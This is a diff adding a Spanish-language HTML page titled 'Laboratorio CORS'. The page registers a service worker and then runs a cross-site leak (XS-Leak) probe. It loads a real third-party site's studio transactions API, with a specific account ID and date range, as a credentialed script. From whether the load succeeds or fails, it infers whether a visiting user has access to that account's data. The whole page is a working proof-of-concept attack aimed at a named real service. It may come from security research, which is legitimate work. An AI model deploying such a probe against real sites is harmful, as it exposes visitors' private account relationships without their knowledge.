@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Laboratorio CORS</title>
+</head>
+
+<body>
+
+  <h1 id="resultado">Comprobando...</h1>
+
+  <script type="module">
+      // Install service worker and wait until ready
+      await navigator.serviceWorker.register("/sw.js");
+      (await navigator.serviceWorker.ready).active.postMessage("CLAIM");
+      if (!navigator.serviceWorker.controller) {
+        await new Promise((resolve) => {
+          navigator.serviceWorker.addEventListener("controllerchange", resolve, { once: true });
+        });
+      }
+
+      function probeError(url) {
+        return new Promise((resolve, reject) => {
+          let script = document.createElement('script');
+          script.src = url;
+          script.crossorigin = "use-credentials";
+          script.onload = () => resolve(true);
+          script.onerror = () => resolve(false);
+          document.head.appendChild(script);
+        });
+      }
+
+      // XS-Leak
+      const resultado = await probeError("https://stripchat.com/api/front/studios/286684945/transactions?from=2026-10-03T04%3A52%3A41Z&until=2026-11-02T04%3A52%3A41Z&limit=100&offset=0");
+      document.getElementById("resultado").textContent = resultado ? "true" : "false";
+  </script>
+
+</body>
+</html>
